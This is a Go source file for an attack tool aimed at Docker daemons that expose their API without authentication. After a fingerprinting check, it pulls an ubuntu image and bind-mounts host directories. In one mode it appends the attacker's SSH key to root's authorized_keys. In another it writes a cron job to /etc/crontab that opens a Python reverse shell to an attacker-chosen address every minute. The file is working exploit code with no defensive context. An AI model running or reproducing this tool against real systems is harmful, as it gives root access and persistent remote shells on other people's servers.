package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"golang.org/x/net/context"
)

const (
	API_VERSION string = `
	---------------------------
	Docker version	API Version
	---------------------------
	1.12.x		1.24
	1.11.x		1.23
	1.10.x		1.22
	1.9.x		1.21
	1.8.x		1.20
	1.7.x		1.19
	1.6.x		1.18
`
)

var (
	flagApiVersion = flag.String("version", "1.12", fmt.Sprintf("Docker version:%v\n", API_VERSION))
	DockerVersion  = fmt.Sprintf("v%v", *flagApiVersion)

	flagType           = flag.String("type", "check", "Type, such as check, root, shell")
	flagTarget         = flag.String("target", "", "target ip, 1.1.1.1:2375")
	flagReverseAddress = flag.String("reverse", "", "reverse address, 6.6.6.6:8888")
	flagSShPubKey      = flag.String("pubkey", filepath.Join(os.Getenv("HOME"), ".ssh/id_rsa.pub"), "id_rsa.pub file")
)

func main() {
	flag.Parse()
	if *flagType == "" || *flagTarget == "" {
		flag.Usage()
	}
	if strings.ToLower(*flagType) == "check" {
		Check(*flagTarget)
	}
	if strings.ToLower(*flagType) == "root" {
		GetRoot(*flagTarget, *flagSShPubKey)

	}
	if strings.ToLower(*flagType) == "shell" {
		if *flagReverseAddress == "" {
			flag.Usage()
		} else {
			GetShell(*flagTarget, *flagReverseAddress)
		}
	}
}

func Check(target string) {
	ctx := context.Background()
	cli, err := client.NewClient(fmt.Sprintf("tcp://%v", target), DockerVersion, nil, nil)
	if err == nil {
		info, err := cli.Info(ctx)
		if err == nil {
			// RFC3339Nano = "2006-01-02T15:04:05.999999999Z07:00"
			t, _ := time.Parse("2006-01-02T15:04:05.999999999Z07:00", info.SystemTime)

			fmt.Printf("%v, %v, %v, %v, %v, %v\n", t.Format("2006-01-02 15:04:05"), info.OperatingSystem, info.Name,
				info.ServerVersion, info.OSType, info.DockerRootDir)
		}
	}
}

func GetRoot(target, publicKey string) {
	pubKey, err := GetPublickey(publicKey)
	if err != nil {
		panic(err)
	}
	ctx := context.Background()
	cli, err := client.NewClient(fmt.Sprintf("tcp://%v", target), DockerVersion, nil, nil)
	if err == nil {
		ret, err := cli.ImagePull(ctx, "ubuntu", types.ImagePullOptions{})
		if err == nil {
			io.Copy(os.Stderr, ret)
			cmd := []string{"/bin/sh", "-c", fmt.Sprintf("echo \"%v\" >> /tmp/.ssh/authorized_keys", pubKey)}
			resp, err := cli.ContainerCreate(ctx, &container.Config{
				Image: "ubuntu",
				Cmd:   cmd,
			}, &container.HostConfig{
				Binds: []string{"/root/:/tmp/:rw"}}, nil, "")
			fmt.Println(resp, err)
			if err == nil {
				err := cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{})
				fmt.Println(resp.ID, err)
				statusId, err := cli.ContainerWait(ctx, resp.ID)
				fmt.Println(statusId, err)
				out, err := cli.ContainerLogs(ctx, resp.ID, types.ContainerLogsOptions{ShowStdout: true})
				io.Copy(os.Stdout, out)
			}
		}
	}
}

func GetShell(target, reverse string) {
	myAddress := strings.Split(reverse, ":")
	var myIp string
	var myPort int
	if len(myAddress) == 2 {
		myIp = myAddress[0]
		myPort, _ = strconv.Atoi(myAddress[1])
	}

	ctx := context.Background()
	cli, err := client.NewClient(fmt.Sprintf("tcp://%v", target), DockerVersion, nil, nil)
	if err == nil {
		ret, err := cli.ImagePull(ctx, "ubuntu", types.ImagePullOptions{})
		if err == nil {
			io.Copy(os.Stderr, ret)
			cmd := []string{"/bin/sh", "-c", fmt.Sprintf("echo \"%v\" >> /etc/crontab", fmt.Sprintf(
				`*/1 * * * *  hartnett /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%v\",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`,
				myIp, myPort))}

			resp, err := cli.ContainerCreate(ctx, &container.Config{
				Image: "ubuntu",
				Cmd:   cmd,
			}, &container.HostConfig{
				Binds: []string{"/etc/:/etc/:rw"}}, nil, "")
			fmt.Println(resp, err)
			if err == nil {
				err := cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{})
				fmt.Println(resp.ID, err)
				statusId, err := cli.ContainerWait(ctx, resp.ID)
				fmt.Println(statusId, err)
				out, err := cli.ContainerLogs(ctx, resp.ID, types.ContainerLogsOptions{ShowStdout: true})
				io.Copy(os.Stdout, out)
			}
		}
	}
}

func GetPublickey(pubKeyName string) (pubKey string, err error) {
	b, err := ioutil.ReadFile(pubKeyName)
	if err == nil {
		pubKey = string(b)
	}
	return pubKey, err
}
